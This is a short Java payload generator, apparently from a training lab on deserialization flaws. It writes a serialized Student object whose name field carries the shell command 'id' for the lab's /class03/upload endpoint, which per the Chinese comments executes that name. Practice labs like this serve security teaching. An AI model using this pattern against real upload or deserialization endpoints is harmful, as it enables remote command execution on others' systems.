package class03;

import java.io.FileOutputStream;
import java.io.ObjectOutputStream;

/**
 * 生成 class03 的 payload — getName() → 命令执行
 * 目标: 上传 Student 对象，靶场调用 getName() 获取命令后 exec
 * 靶场: /class03/upload
 */
public class GenPayload {
    public static void main(String[] args) throws Exception {
        // 将 name 设为要执行的系统命令
        Student student = new Student("id", 18);

        ObjectOutputStream oos = new ObjectOutputStream(
            new FileOutputStream("class03.ser"));
        oos.writeObject(student);
        oos.close();

        System.out.println("✅ 已生成: class03.ser");
    }
}
